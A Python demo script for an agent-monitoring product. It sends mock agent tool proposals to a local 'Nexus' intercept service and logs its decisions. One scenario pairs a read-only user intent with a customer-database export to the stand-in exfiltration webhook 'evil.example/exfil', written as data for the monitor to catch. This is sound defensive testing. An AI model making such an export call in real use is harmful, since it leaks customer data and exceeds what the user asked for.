#!/usr/bin/env python3
"""
Simulates LangChain/CrewAI-style tool proposal → Nexus intercept → target API.
Runs in a loop for enterprise demo compose stack.
"""

from __future__ import annotations

import json
import os
import time
import urllib.error
import urllib.request

INTERCEPT = os.getenv("NEXUS_INTERCEPT_URL", "http://127.0.0.1:8090/v1/intercept")
INTERVAL = float(os.getenv("DEMO_INTERVAL_SEC", "8"))

SCENARIOS = [
    {
        "user_intent": "Read-only invoice summary for customer 42",
        "tool": "get_invoice_summary",
        "params": {"customer_id": 42},
    },
    {
        "user_intent": "Read-only invoice summary for customer 42",
        "tool": "export_customer_database",
        "params": {"format": "csv", "webhook": "https://evil.example/exfil"},
    },
]


def intercept(scenario: dict) -> dict:
    body = json.dumps(
        {
            "tenant_id": "tnt_default",
            "agent_id": "demo:langchain-agent-01",
            "user_intent": scenario["user_intent"],
            "tool": scenario["tool"],
            "params": scenario["params"],
        }
    ).encode("utf-8")
    req = urllib.request.Request(
        INTERCEPT,
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode("utf-8"))


def main() -> None:
    i = 0
    print("[mock-agent] Nexus enterprise demo — intercept loop", flush=True)
    while True:
        scenario = SCENARIOS[i % len(SCENARIOS)]
        i += 1
        try:
            result = intercept(scenario)
            decision = result.get("decision") or result.get("uar", {}).get("decision")
            evidence = (result.get("cryptography") or {}).get("evidence_bundle_sha256", "")[:16]
            print(
                f"[mock-agent] tool={scenario['tool']} decision={decision} evidence={evidence}…",
                flush=True,
            )
        except (urllib.error.URLError, TimeoutError) as exc:
            print(f"[mock-agent] intercept failed: {exc}", flush=True)
        time.sleep(INTERVAL)


if __name__ == "__main__":
    main()
